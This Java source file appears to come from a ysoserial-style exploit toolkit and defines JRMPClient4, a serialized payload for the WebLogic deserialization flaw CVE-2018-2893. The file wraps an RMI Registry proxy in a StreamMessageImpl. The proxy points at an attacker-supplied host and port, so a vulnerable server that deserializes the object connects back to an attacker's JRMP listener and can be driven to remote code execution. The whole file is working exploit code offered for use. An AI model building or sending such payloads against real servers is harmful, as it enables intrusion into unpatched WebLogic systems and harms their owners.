package payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import weblogic.jms.common.StreamMessageImpl;
import common.Serializerable;
import payloads.annotation.Authors;
import util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

// CVE-2018-2893
@SuppressWarnings ( {
        "restriction"
} )
@Authors({ Authors.CCKUAILONG })
public class JRMPClient4 extends PayloadRunner implements ObjectPayload<Object> {

    public Object streamMessageImpl(byte[] object) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Object object = Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler);
        return streamMessageImpl(Serializerable.serialize(object));
    }


    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient4.class.getClassLoader());
        return PayloadRunner.run(JRMPClient4.class, command, fusion);
    }
}
